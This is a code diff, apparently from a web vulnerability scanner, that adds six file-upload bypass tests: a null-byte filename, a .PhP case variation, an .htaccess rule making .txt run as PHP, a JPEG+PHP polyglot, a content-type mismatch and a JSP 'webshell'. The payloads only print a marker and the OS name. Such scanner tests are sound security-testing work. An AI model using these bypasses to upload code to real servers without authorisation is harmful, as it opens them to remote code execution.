@@ -93,6 +93,24 @@
       # Test 7: HTML upload (stored XSS)
       {'filename': 'test.html', 'content': '<html><body><script>alert("UPLOAD_XSS")</script></body></html>',
        'content_type': 'text/html', 'check': 'alert("UPLOAD_XSS")', 'label': 'HTML stored XSS'},
+      # Test 8: Null byte bypass (%00 in filename)
+      {'filename': 'shell.php\x00.jpg', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'image/jpeg',
+       'check': 'UPLOAD_TEST_', 'label': 'null byte in filename'},
+      # Test 9: Case variation bypass
+      {'filename': 'shell.PhP', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>', 'content_type': 'application/x-php',
+       'check': 'UPLOAD_TEST_', 'label': 'case variation (.PhP)'},
+      # Test 10: .htaccess upload (Apache — makes .txt execute as PHP)
+      {'filename': '.htaccess', 'content': 'AddType application/x-httpd-php .txt', 'content_type': 'text/plain',
+       'check': '', 'label': '.htaccess config upload'},
+      # Test 11: Polyglot JPEG (valid JPEG header + PHP code)
+      {'filename': 'poly.php.jpg', 'content': '\xff\xd8\xff\xe0<?php echo "UPLOAD_TEST_" . php_uname(); ?>\xff\xd9',
+       'content_type': 'image/jpeg', 'check': 'UPLOAD_TEST_', 'label': 'polyglot JPEG+PHP'},
+      # Test 12: Content-Type mismatch (send PHP with image/png header)
+      {'filename': 'image.php', 'content': '<?php echo "UPLOAD_TEST_" . php_uname(); ?>',
+       'content_type': 'image/png', 'check': 'UPLOAD_TEST_', 'label': 'content-type mismatch bypass'},
+      # Test 13: JSP webshell (for Java apps)
+      {'filename': 'shell.jsp', 'content': '<%@ page import="java.io.*" %><% out.print("UPLOAD_TEST_" + System.getProperty("os.name")); %>',
+       'content_type': 'text/html', 'check': 'UPLOAD_TEST_', 'label': 'JSP webshell'},
   ]
 
   upload_findings = []
